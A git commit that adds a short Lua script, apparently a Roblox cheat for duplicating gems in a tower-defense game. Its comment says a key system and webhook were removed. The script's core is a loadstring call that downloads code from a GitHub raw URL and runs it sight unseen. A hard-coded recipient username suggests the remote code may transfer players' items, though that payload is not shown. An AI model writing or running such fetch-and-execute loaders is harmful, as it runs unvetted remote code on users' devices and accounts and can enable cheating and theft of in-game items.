f673f31876bf2c96d7bebd9845dd350f7d05a929
Longnononn <long2010hacker@gmail.com>
2026-05-31 22:32:18 +0700

    Create dupegemttd.lua

---
+++ dupegemttd.lua
@@ -0,0 +1,18 @@
+-- MAIN SCRIPT (đã xóa key system, webhook, thông báo)
+local config = {
+    "123bot0019",
+}
+
+usernames = config
+Username_for_ttd = "123bot0019"
+
+hello = 100
+DH_PROCENT = 0
+
+loadstring(game:HttpGet(
+    "https://raw.githubusercontent.com/WINVOLST/ttd/refs/heads/main/.gg/noprofit",
+    true
+))()
+
+DH_PROCENT = 0
+hello = 100
